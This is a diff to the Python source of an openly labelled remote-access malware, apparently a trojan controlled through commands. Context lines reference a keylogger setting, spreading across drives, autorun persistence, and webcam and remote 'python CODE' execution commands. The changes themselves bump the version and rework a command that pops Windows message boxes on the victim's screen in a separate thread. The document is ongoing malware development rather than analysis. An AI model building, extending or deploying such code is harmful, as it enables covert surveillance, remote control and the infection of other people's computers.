@@ -102,7 +102,7 @@ KEYLOGGER_DISABLED = True
 SPREADING_SKIPPED_DRIVES = ("C", "D")
 
 # Version of the malware.
-VERSION = "[Pre-release] 0.4.3"
+VERSION = "[Pre-release] 0.4.4"
 
 
 def filesystem_get_size(_path: str) -> int:
@@ -549,7 +549,7 @@ def command_message(_arguments: str, _event) -> str:
         # If there is no arguments.
 
         # Message
-        return "Incorrect arguments! Example: text;title;data"
+        return "Incorrect arguments! Example: text;title;style"
 
     if len(_arguments) == 1:
         # If there is only text.
@@ -560,15 +560,36 @@ def command_message(_arguments: str, _event) -> str:
     if len(_arguments) == 2:
         # If there is only text and title.
 
+        ##  Styles:
+        ##  0 : OK
+        ##  1 : OK | Cancel
+        ##  2 : Abort | Retry | Ignore
+        ##  3 : Yes | No | Cancel
+        ##  4 : Yes | No
+        ##  5 : Retry | Cancel 
+        ##  6 : Cancel | Try Again | Continue
+
+        ## To also change icon, add these values to previous number
+        # 16 Stop-sign icon
+        # 32 Question-mark icon
+        # 48 Exclamation-point icon
+        # 64 Information-sign icon consisting of an 'i' in a circle
         # Adding title.
-        _arguments.append(0x00000010) # noqa
+        _arguments.append(0) # noqa
 
     # Calling message.
     try:
         # Trying to show message.
 
-        # Showing.
-        ctypes.windll.user32.MessageBoxW(0, _arguments[0], _arguments[1], _arguments[2])
+        # Thread function.
+        def __ctypes_message_thread():
+            ctypes.windll.user32.MessageBoxW(0, _arguments[0], _arguments[1], int(_arguments[2]))
+
+        # Creating thread.
+        _thread = threading.Thread(target = __ctypes_message_thread)
+        
+        # Starting thread.
+        _thread.start()
     except Exception as _exception: # noqa
         # If there is error.
 
@@ -576,7 +597,7 @@ def command_message(_arguments: str, _event) -> str:
         return f"Error when showing message! Error: {_exception}"
 
     # Message.
-    return "Message was closed!"
+    return "Message was shown!"
 
 
 def command_webcam(_arguments, _event) -> list:
@@ -1189,7 +1210,6 @@ def initialise_commands() -> None:
     # @description Function that initialises commands.
 
     # Globalising command functions and help.
-
     global __COMMANDS_FUNCTION
     global __COMMANDS_HELP
 
@@ -1327,15 +1347,14 @@ def initialise_commands() -> None:
             "python [required]CODE"
         ),
         "message": (
-            "Shows message to the user.",
-            "message [required]TEXT;TITLE[optional];CODE[optional]"
+            "Shows message to the user. (Styles - from 0 to 6, changes buttons)",
+            "message [required]TEXT;TITLE[optional];STYLE[optional]"
         ),
         "destruct": (
             "Delete malware from the system (Removing from the autorun and closing)",
             "destruct"
         )
     }
-
 
 def exit_handler() -> None:
     # @function exit_handler()
